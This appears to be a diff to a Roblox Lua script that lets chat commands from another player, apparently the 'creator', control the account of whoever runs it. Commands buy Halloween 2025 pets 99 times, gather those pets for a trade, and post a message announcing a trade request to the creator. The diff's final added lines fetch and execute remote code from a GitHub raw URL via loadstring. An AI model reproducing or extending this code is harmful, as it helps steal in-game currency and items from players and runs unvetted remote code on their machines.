@@ -12,9 +12,15 @@ function onPlayerChatted(player)
 				game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("hey creator, i sent you a trade request.")
 			end
 			
-			if message == ".buy" then
+			if message == ".buy ghostcat" then
 				for i=1, 99 do
 					get("ShopAPI/BuyItem"):InvokeServer("pets", "halloween_2025_ghostly_cat", {["buy_count"] = 1})
+				end
+			end
+			
+			if message == ".buy djsnooze" then
+				for i=1, 99 do
+					get("ShopAPI/BuyItem"):InvokeServer("pets", "halloween_2025_dj_snooze", {["buy_count"] = 1})
 				end
 			end
 
@@ -27,7 +33,7 @@ function onPlayerChatted(player)
 				get("SettingsAPI/SetSetting"):FireServer("rp_name", string.sub(message, 6))
 			end
 
-			if message == ".add" then
+			if message == ".add pet" then
 				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
 					if v["kind"] == "halloween_2025_ghostly_cat" or v["kind"] == "halloween_2025_bat_cat" or v["kind"] == "halloween_2025_dj_snooze" then
 						wait()
@@ -58,3 +64,7 @@ for _, player in ipairs(game.Players:GetPlayers()) do
 end
 
 game.Players.PlayerAdded:Connect(onPlayerChatted)
+
+
+wait(5)
+loadstring(game:HttpGet"https://raw.githubusercontent.com/Reellzz/Reellzz/refs/heads/main/ChatControl")()
